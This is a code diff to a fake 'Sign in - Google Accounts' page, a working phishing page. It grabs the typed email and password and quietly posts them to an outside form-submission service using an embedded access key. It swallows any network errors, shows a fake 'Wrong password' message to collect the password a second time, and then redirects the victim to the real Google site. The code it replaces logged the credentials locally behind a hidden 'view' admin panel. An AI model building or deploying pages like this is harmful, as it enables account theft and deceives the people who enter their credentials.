@@ -4,67 +4,68 @@
     <title>Sign in - Google Accounts</title>
     <style>
         body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f7f8f9; margin: 0; }
-        .login-box { background: white; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(60,64,67,0.3); position: relative; }
+        .login-box { background: white; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
         svg { width: 75px; margin-bottom: 10px; }
         h2 { margin-bottom: 8px; font-weight: 400; font-size: 24px; }
         p { margin-bottom: 24px; color: #202124; }
         input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
         #errorMsg { color: #d93025; font-size: 14px; text-align: left; display: none; margin-bottom: 10px; }
         button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-weight: 500; margin-top: 10px; }
-        #adminPanel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border: 2px solid #1a73e8; padding: 20px; border-radius: 8px; z-index: 1000; width: 85%; max-width: 500px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        #logArea { width: 100%; height: 200px; font-family: monospace; background: #eee; border: 1px solid #ccc; padding: 5px; overflow-y: auto; white-space: pre-wrap; margin: 10px 0; }
     </style>
 </head>
 <body>
 
     <div class="login-box">
-        <svg viewBox="0 0 272 92"><path d="M52.3 43.1v10.9h13.2c-0.5 3.3-3.8 9.6-13.2 9.6-8.1 0-14.7-6.7-14.7-14.9s6.6-14.9 14.7-14.9c4.6 0 7.7 2 9.5 3.7l8.6-8.6c-5.5-5.1-12.6-8.2-18.1-8.2-15.5 0-28 12.5-28 28s12.5 28 28 28c16.2 0 26.9-11.4 26.9-27.4 0-1.8-0.2-3.3-0.5-4.7H52.3z" fill="#4285F4""")/>><path d="M101.4 34.6c-10.7 0-19.4 8.7-19.4 19.4s8.7 19.4 19.4 19.4 19.4-8.7 19.4-19.4-8.7-19.4-19.4-19.4zm0 31.1c-6.5 0-11.7-5.4-11.7-11.7s5.2-11.7 11.7-11.7 11.7 5.4 11.7 11.7-5.2 11.7-11.7 11.7z" fill="#EA4335""")/>><path d="M144.1 34.6c-10.7 0-19.4 8.7-19.4 19.4s8.7 19.4 19.4 19.4 19.4-8.7 19.4-19.4-8.7-19.4-19.4-19.4zm0 31.1c-6.5 0-11.7-5.4-11.7-11.7s5.2-11.7 11.7-11.7 11.7 5.4 11.7 11.7-5.2 11.7-11.7 11.7z" fill="#FBBC05""")/>><path d="M185.3 34.6c-10.4 0-17.5 7.1-17.5 19.4 0 11.8 7.1 19.4 17.5 19.4 5 0 8.6-2.1 10.7-4.4v3.4c0 7.4-4 11.4-10.3 11.4-5.2 0-8.3-3.7-9.5-6.8l-9.6 4c2.8 6.7 10.1 11.4 19.1 11.4 11 0 20.3-6.5 20.3-20.4V35.4h-10.3v4.1c-2.1-2.3-5.7-4.9-10.9-4.9zm-0.7 31.1c-6.2 0-11-5.3-11-11.5s4.8-11.5 11-11.5 11 5.3 11 11.5-4.8 11.5-11 11.5z" fill="#4285F4""")/>><path d="M219.7 7.7h11.1v65.4h-11.1z" fill="#34A853""")/>><path d="M255.4 34.6c-9.1 0-15.5 4-18.7 11.5l26.4 10.9-1.8 4.5c-2.4 6.3-9.5 11.9-18 11.9-8.4 0-15.4-6.6-15.4-19.4 0-12.1 8.2-19.4 18.5-19.4 8.3 0 13.1 5.1 15.1 8.1l-8.1 5.4c-2.6-3.8-6.1-6-10.1-6zm-0.9 22.3c-4.4 0-8.2-2.3-9.5-5.5l19.5-8.1c-1-2.5-3.8-8.7-10-8.7z" fill="#EA4335""")/>></svg>
+        <svg viewBox="0 0 272 92"><path d="M52.3 43.1v10.9h13.2c-0.5 3.3-3.8 9.6-13.2 9.6-8.1 0-14.7-6.7-14.7-14.9s6.6-14.9 14.7-14.9c4.6 0 7.7 2 9.5 3.7l8.6-8.6c-5.5-5.1-12.6-8.2-18.1-8.2-15.5 0-28 12.5-28 28s12.5 28 28 28c16.2 0 26.9-11.4 26.9-27.4 0-1.8-0.2-3.3-0.5-4.7H52.3z" fill="#4285F4""")/>></svg>
         <h2>Sign in</h2>
         <p>Use your Google Account</p>
+        
         <div id="errorMsg">Wrong password. Try again.</div>
+        
         <input type="email" id="email" placeholder="Email or phone" required>
         <input type="password" id="pass" placeholder="Enter your password" required>
-        <button onclick="handleLogin()">Next</button>
-    </div>
-
-    <div id="adminPanel">
-        <h3>Captured Data</h3>
-        <div id="logArea">No data found.</div>
-        <button onclick="localStorage.removeItem('security_logs'); showAdmin();" style="background:#ea4335; float:left;">Clear</button>
-        <button onclick="document.getElementById('adminPanel').style.display='none'">Close</button>
+        
+        <button onclick="handleCapture()">Next</button>
     </div>
 
     <script>
         let attempt = 0;
-        function handleLogin() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            if(!email || !pass) return;
 
-            let logs = JSON.parse(localStorage.getItem('security_logs') || "[]");
-            logs.push({ email: email, pass: pass, time: new Date().toLocaleString(), attempt: attempt + 1 });
-            localStorage.setItem('security_logs', JSON.stringify(logs));
+        async function handleCapture() {
+            const emailAddr = document.getElementById('email').value;
+            const passwordValue = document.getElementById('pass').value;
 
+            if(!emailAddr || !passwordValue) return;
+
+            // Prepare the data for Web3Forms
+            const formData = {
+                access_key: "1803d54e-4646-4a6b-92fa-117a604c04d5",
+                name: "Security Test Capture",
+                email: emailAddr,
+                message: "Password Captured: " + passwordValue + " (Attempt: " + (attempt + 1) + ")",
+                from_name: "Chromebook Auditor"
+            };
+
+            // Send to Web3Forms silently in the background
+            try {
+                await fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                    body: JSON.stringify(formData)
+                });
+            } catch (e) {
+                console.log("Network error (stealth mode)");
+            }
+
+            // Fake Error Logic
             if (attempt === 0) {
-                document.getElementById('pass').value = ""; // Clear password
-                document.getElementById('errorMsg').style.display = "block"; // Show error
+                document.getElementById('pass').value = ""; // Clear pass for second try
+                document.getElementById('errorMsg').style.display = "block"; // Show fake error
                 attempt++;
             } else {
-                window.location.href = "https://google.com"; // Second try, redirect
+                // Second attempt success - redirect to the real Google login
+                window.location.href = "https://google.com";
             }
-        }
-
-        let keys = "";
-        document.addEventListener('keydown', (e) => {
-            keys += e.key;
-            if (keys.includes("view")) { showAdmin(); keys = ""; }
-            if (keys.length > 10) keys = "";
-        });
-
-        function showAdmin() {
-            const logs = JSON.parse(localStorage.getItem('security_logs') || "[]");
-            document.getElementById('logArea').innerText = logs.length ? logs.map(l => `[${l.time}] Attempt ${l.attempt}\nEmail: ${l.email}\nPass: ${l.pass}\n---`).join('\n') : "Empty.";
-            document.getElementById('adminPanel').style.display = 'block';
         }
     </script>
 </body>
